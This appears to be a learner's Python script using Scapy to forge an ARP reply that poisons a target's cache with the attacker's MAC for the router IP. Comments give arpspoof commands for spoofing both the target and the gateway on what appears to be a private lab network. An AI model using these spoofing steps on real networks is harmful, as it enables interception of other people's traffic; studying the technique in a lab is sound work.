#/usr/bin/env python
# Rebuild
from scapy.all import ARP

target_interface_1 = "192.168.63.174" # IP Address of a remote machine to Target.
target_interface_2 = "192.168.63.177" # IP Address of a remote machine to Target.
target_mac_1 = "00:0c:29:3a:62:c0"
router_ip = "192.168.63.2"
my_ip = "192.168.63.139"
my_mac = "00-0c-29-fe-37-29"

# Prior to Spoofing, the Target machine can ping and connect to my webserver.
# BASIC DEMONSTRATION OF WHAT WE HOPE TO ACHIEVE
# Using arpspoof at the command line, run both in different windows
# FOOL THE TARGET
# sudo arpspoof -i eth0 [TARGET IP] -t [GATEWAY IP]
# FOOL THE ROUTER (GATEWAY)
# sudo arpspoof -i eth0 [GATEWAY IP] -t [TARGET IP]
# TESTED: Spoof running, Target machine can ping out, and load my webserver.
# Which had stopped working in the complete script.

# CREATE AN ARP PACKET and store it in packet
# op=2: specifies an ARP reply packet (is-at),
# used to announce or update MAC address mappings in an ARP Cache.
# pdst: IP Target (Destination) computer.
# hwdst: The Target (Destination) MAC Address.
# psrc: source IP, which is the IP of the Router (Gateway)
# The target machine will think the packet has come from the Router

packet = ARP(op=2, pdst=target_interface_1, hwdst=target_mac_1, psrc=router_ip)
# packet.show() will show us the MAC Address of the Router IP [*hwsrc*] is now our MAC.
# packet.summary() provides similar, in the format: ARP is at [OUR_MAC_ADDRESS] says [ROUTER_IP]
print(packet.show())
print(packet.summary())